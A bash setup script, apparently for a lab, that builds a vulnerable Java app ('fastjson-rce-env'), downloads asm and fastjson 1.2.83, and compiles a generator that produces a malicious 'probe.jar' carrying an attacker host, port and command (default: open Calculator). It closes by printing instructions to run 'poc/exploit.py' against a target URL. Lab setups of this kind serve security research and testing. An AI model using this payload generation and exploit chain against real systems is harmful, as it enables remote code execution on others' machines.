#!/bin/bash
# 构建靶场 + 生成恶意 probe
set -e
cd "$(dirname "$0")/.."

LHOST=${1:-"127.0.0.1"}
LPORT=${2:-"19090"}
CMD=${3:-"open -a Calculator"}

echo "[*] Building target app..."
mvn package -DskipTests -q

echo "[*] Downloading dependencies..."
mkdir -p poc/lib
[ -f poc/lib/asm-9.6.jar ] || curl -sL -o poc/lib/asm-9.6.jar https://repo1.maven.org/maven2/org/ow2/asm/asm/9.6/asm-9.6.jar
[ -f poc/lib/fastjson-1.2.83.jar ] || curl -sL -o poc/lib/fastjson-1.2.83.jar https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.83/fastjson-1.2.83.jar

echo "[*] Compiling probe generator..."
javac -cp "poc/lib/*" -d poc poc/GenProbe.java

echo "[*] Generating probe.jar (lhost=$LHOST lport=$LPORT cmd=$CMD)..."
java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" GenProbe "$LHOST" "$LPORT" "$CMD"

echo "[+] Done. Run with:"
echo "    java -jar target/fastjson-rce-env-1.0.0.jar"
echo "    python3 poc/exploit.py $LHOST $LPORT http://TARGET:18080"
